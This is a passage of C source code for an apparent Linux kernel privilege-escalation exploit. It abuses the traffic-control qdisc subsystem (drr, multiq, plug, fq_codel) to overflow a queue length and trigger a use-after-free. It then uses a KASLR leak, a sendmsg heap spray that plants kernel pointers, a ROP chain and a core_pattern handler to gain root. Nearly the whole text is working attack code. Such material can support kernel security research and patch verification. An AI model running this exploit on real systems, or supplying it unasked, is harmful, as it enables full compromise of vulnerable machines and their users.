    // although the first 6 req can be small, we have to same the same packet data in order to enter the same queue
    // the sizes of the first 6 req does not affect the dropping logic
    for (int i = 0; i < 7; i++)
        SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class1), mq_dev_packet_payload, sizeof(mq_dev_packet_payload)));

    // 3. UNPLUG drr
    SYSOK(modify_qdisc_plug_unplug(netlink_fd, get_id(plug_name), get_id(drr_class2))); // trigger all dequeues
}

void overflow_qlen(const int netlink_fd)
{
    // resetting interface removes all qlen, but does not affect fq_codel drops
    SYSOK(set_interface_down(netlink_fd, MQ_DEV));
    SYSOK(set_interface_up(netlink_fd, MQ_DEV));

    // ATP, qlen = 0 for all, drops = 3 for fq_codel
    SYSOK(modify_qdisc_plug_replug(netlink_fd, get_id(plug_name), get_id(drr_class2)));

    // These next 3 lines ensures that the mega parent drr's first entry in the active is a plug
    // So that subsequently, if dequeue() is called, we don't immediately run into the corrupt (UAF) multiq
    // Recall that in setup_drr_multiq(), we already created a filter to direct all packets into 1:1
    SYSOK(create_filter_src_port(netlink_fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:2"), MQ_DEV_SRC_PORT)); // replace the existing filter
    SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class2), mq_dev_packet_payload, sizeof(mq_dev_packet_payload)));        // above plug (1:2)
    SYSOK(create_filter_src_port(netlink_fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:1"), MQ_DEV_SRC_PORT)); // restore the original filter

    SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class2), mq_dev_packet_payload, sizeof(mq_dev_packet_payload))); // plug
    SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class1), mq_dev_packet_payload, sizeof(mq_dev_packet_payload))); // fq_codel
    // ATP drr has qlen = 2
    SYSOK(modify_qdisc_fqcodel(netlink_fd, get_id(fq_codel_name), get_id(drr_class1))); // trigger -3 for parent
    // ATP drr has qlen = UINT32_MAX-1

    // overflow drr qlen to 0
    SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class2), mq_dev_packet_payload, sizeof(mq_dev_packet_payload))); // plug
}

const char *determine_band(const int netlink_fd, const int num_tx)
{
    // the idea is simple, we want to figure out which queue our packet goes into, based on its hash
    // so, we simply create plugs across all its bands, then send the packet
    // we use tc -s to figure out which plug it is currently backlogged in
    // with the info, we can reset the situation by removing all the plugs

    // note, the requests must all send the same payload (+ size) in order to have the same hash
    // but luckily, priority is not part of the hashed data, so we can modify that.

    // repeat until we get consistent findings
    while (1)
    {

        // 1. setup plugs
        for (int i = 0; i < num_tx; i++)
        {
            int band = 0x20000 + i + 1;
            int plug = 0x10000 * (i + 3);
            SYSOK(create_qdisc_plug4096(netlink_fd, plug, band));
        }

        // 2. send packet
        SYSOK(send_mq_dev_raw_with_payload(get_id("3:2"), mq_dev_packet_payload, sizeof(mq_dev_packet_payload))); // plug

        // 3. determine band: tc -s qdisc show dev MQ_DEV
        char *result = NULL;
        int findings = 0;

        /* output format:
    qdisc drr 1: root refcnt 11
     Sent 0 bytes 0 pkt (dropped 0, overlimits 0 requeues 0)
     backlog 1042b 1p requeues 0
    qdisc multiq 2: parent 1:1 bands 10/10
     Sent 0 bytes 0 pkt (dropped 0, overlimits 0 requeues 0)
     backlog 0b 1p requeues 0
    qdisc plug 4: parent 2:2
     Sent 0 bytes 0 pkt (dropped 0, overlimits 0 requeues 0)
     backlog 0b 0p requeues 0
    ...
    qdisc plug 9: parent 2:7
     Sent 0 bytes 0 pkt (dropped 0, overlimits 0 requeues 0)
     backlog 1042b 1p requeues 0
        */

        // Execute the tc command and get its output
        // bin from https://github.com/static-linux/static-binaries-i386/blob/master/iproute2-4.0.0.tar.gz
        FILE *fp = popen("./tc -s qdisc show dev " MQ_DEV, "r");
        if (fp == NULL)
            fatal("Failed to run tc command");

#define MAX_LINE_LENGTH 0x100
        char line[MAX_LINE_LENGTH];
        char parent_id[32] = {0};
        char qdisc_type[32] = {0};
        char qdisc_id[32] = {0};
        int check_backlog = 0;
        // Process the output line by line
        while (fgets(line, sizeof(line), fp) != NULL)
        {
            // Check if line starts with "qdisc plug"
            if (sscanf(line, " qdisc %s %s parent %s", qdisc_type, qdisc_id, parent_id) == 3)
            {
                check_backlog = strcmp(qdisc_type, "plug") == 0;
                continue;
            }

            if (check_backlog == 1)
            {
                // skip "Sent 0 bytes 0 pkt..." line
                check_backlog++;
                continue;
            }

            if (check_backlog == 2)
            {
                check_backlog = 0;
                int backlog_bytes = 0;
                // Extract backlog bytes, skipping first whitespace char
                if (sscanf(&line[1], "backlog %db", &backlog_bytes) == 1)
                {
                    if (backlog_bytes >= (int)sizeof(mq_dev_packet_payload))
                    {
                        result = strdup(parent_id);
                        // if another packet somehow entered the network device, we will have multiple findings
                        // in such case, we will repeat the test
                        findings++;
                    }
                }
            }
        }

        pclose(fp);

        // 4. delete plugs, resetting multiq back to normal
        for (int i = 0; i < num_tx; i++)
        {
            int band = 0x20000 + i + 1;
            int plug = 0x10000 * (i + 3);
            SYSOK(delete_qdisc(netlink_fd, plug, band, "plug"));
        }

        if (findings == 1)
            return result;
    }

    return "";
}

void setup_drr_multiq(int netlink_fd, int num_tx)
{
    SYSOK(create_multiqueue_device(netlink_fd, MQ_DEV, num_tx, num_tx));
    PWN_TC_QDISC_INTERFACE = MQ_DEV;
    PWN_TC_FILTER_INTERFACE = MQ_DEV;

    SYSOK(set_interface_up(netlink_fd, MQ_DEV));

    SYSOK(create_qdisc(netlink_fd, get_id("1:0"), TC_H_ROOT));
    /* create a filter to direct all packets to 1:1
    but we want to drop all unrelated traffic, so we filter on the packet source port
    subsequent requests will all use source port = MQ_DEV_SRC_PORT, so they will pass the filter */
    SYSOK(create_filter_src_port(netlink_fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:1"), MQ_DEV_SRC_PORT));
    SYSOK(create_class(netlink_fd, get_id("1:1"), get_id("1:0")));
    SYSOK(create_class(netlink_fd, get_id("1:2"), get_id("1:0")));
    SYSOK(create_qdisc_multiq(netlink_fd, get_id("2:0"), get_id("1:1")));
}

void setup_uaf_miti(int netlink_fd)
{
    _Static_assert(sizeof(mq_dev_packet_payload) > INITIAL_MTU);
    const int num_tx = (8192 / 8) + 1;
    setup_drr_multiq(netlink_fd, num_tx);

    const char *target_band = determine_band(netlink_fd, num_tx);
    printf("[+] determined band: %s\n", target_band);

    SYSOK(create_qdisc_plug4096(netlink_fd, get_id("10:0"), get_id("1:2"))); // this will be used in trigger_vuln_tree to be the front of drr active list

    SYSOK(setup_vuln_tree(netlink_fd, target_band));
    trigger_bug(netlink_fd);
    overflow_qlen(netlink_fd);

    // reduces noise by dropping all packets entering the drr
    SYSOK(create_filter(netlink_fd, get_u32_handle("800::800"), get_id("1:0"), 0xffff));

    puts("[~] deleting multiq parent class");
    SYSOK(delete_class(netlink_fd, get_id("1:1"), get_id("1:0"), "multiq"));
}

void do_spray_sendmsg()
{
    // reclaim the freed multiq q->queues
    size_t *queues = (size_t *)spray_buf;
    // write pointers over the first few queues, where curband is pointing into
    for (size_t i = 0; i < 10; i++)
    {
        queues[i] = KERNFS_ADDR + KERNFS_BUF_QDISC_OFFSET;
    }
    puts("[+] spraying sendmsg");
    spray_sendmsg();
}

void trigger_uaf_miti(int netlink_fd)
{
    // finally, we trigger unplug
    puts("[+] unplugging, trigger drr dequeue");
    SYSOK(modify_qdisc_plug_unplug(netlink_fd, get_id("10:0"), get_id("1:2"))); // trigger all dequeues
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, 2, 0);
    if (argc > 1)
    {
        core_pattern_handler(argv);
    }

    g_kernel_base = kaslr_leak();
    printf("[>] Kernel base address: 0x%lx\n", g_kernel_base);

    if (geteuid() != 0)
        setup_userns();

    set_cpu(0); // main exploit thread runs on CPU 0. others will run on CPU 1.

    puts("[~] forking process for core_pattern exp later");
    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        set_cpu(1);
        crash();
    }

    const int netlink_fd = netlink_open(NETLINK_ROUTE);
    if (netlink_fd < 0)
    {
        fprintf(stderr, "Failed to open Netlink socket\n");
        return EXIT_FAILURE;
    }

    SYSOK(set_interface_up(netlink_fd, "lo"));

    // referenced by sendmsg payload later, so we set it up first since we already have kaslr leak
    prepare_rop();

    puts("[+] prepping UAF");
    setup_uaf_miti(netlink_fd);

    // reclaim freed multiq q->queues with sendmsg
    do_spray_sendmsg();

    // trigger drr_dequeue on UAF object
    trigger_uaf_miti(netlink_fd);

    return 0;
}